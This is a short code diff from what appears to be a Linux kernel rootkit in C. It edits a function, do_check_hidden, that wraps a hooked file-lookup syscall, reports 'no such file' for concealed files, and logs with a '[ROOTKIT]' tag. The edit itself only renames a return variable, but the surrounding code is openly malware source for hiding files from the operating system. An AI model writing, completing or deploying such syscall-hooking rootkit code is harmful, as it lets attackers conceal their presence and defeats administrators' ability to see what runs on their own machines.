@@ -32,7 +32,7 @@ const signal_handler_t P_SIG_HANDLERS[] = {
 long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, const int i32_dfd,
                      const char __user *const s_filename, const int i32_at_flags)
 {
-    long l_ret                     = 0;    // Return value of the real syscall
+    long i64_ret                   = 0;    // Return value of the real syscall
     unsigned int ui32_lookup_flags = 0;    // Lookup flags used when parsing path
     const char *s_filename_k       = NULL; // Kernel buffer for file name
 
@@ -65,8 +65,8 @@ long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, con
         return -ENOENT; // No such file or directory
     }
 
-    l_ret = orig_func(p_regs);
-    pr_info("[ROOTKIT] * Return value: %ld\n", l_ret);
+    i64_ret = orig_func(p_regs);
+    pr_info("[ROOTKIT] * Return value: %ld\n", i64_ret);
 
-    return l_ret;
+    return i64_ret;
 }
